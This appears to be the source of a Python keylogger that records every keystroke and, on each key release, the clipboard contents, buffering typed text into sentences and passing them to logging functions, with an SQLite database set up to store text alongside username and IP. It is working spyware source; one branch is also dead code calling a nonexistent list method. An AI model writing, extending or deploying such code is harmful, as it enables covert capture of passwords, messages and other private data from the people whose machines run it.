import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence
import re

# Database setup
DB_FILE = "keylogs.db"


def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """
    )
    c.execute(
        """
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """
    )
    conn.commit()
    conn.close()


# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.alt,
    keyboard.Key.alt_gr,
    keyboard.Key.tab,
    keyboard.Key.caps_lock,
    keyboard.Key.delete,
    keyboard.Key.esc,
    keyboard.Key.up,
    keyboard.Key.down,
    keyboard.Key.left,
    keyboard.Key.right,
}


def log_buffer():
    global buffer
    if buffer:
        sentence = "".join(buffer)
        sentence = re.sub(r"\s+", " ", sentence.replace("\n", " "))
        log_sentence(sentence)
        buffer = []


def on_press(key):
    global buffer
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, "char") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            if buffer:
                buffer.append("\n")
                log_buffer()
        elif key == keyboard.Key.space:
            buffer.append(" ")
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        else:
            if key in modifier_keys:  # Only add non-modifier keys to buffer
                if buffer:
                    buffer.discard(str(key))
                    log_buffer()

    except Exception as e:
        print(f"Error logging keystroke: {e}")


def on_release(key):
    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f"Error capturing clipboard: {e}")


# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
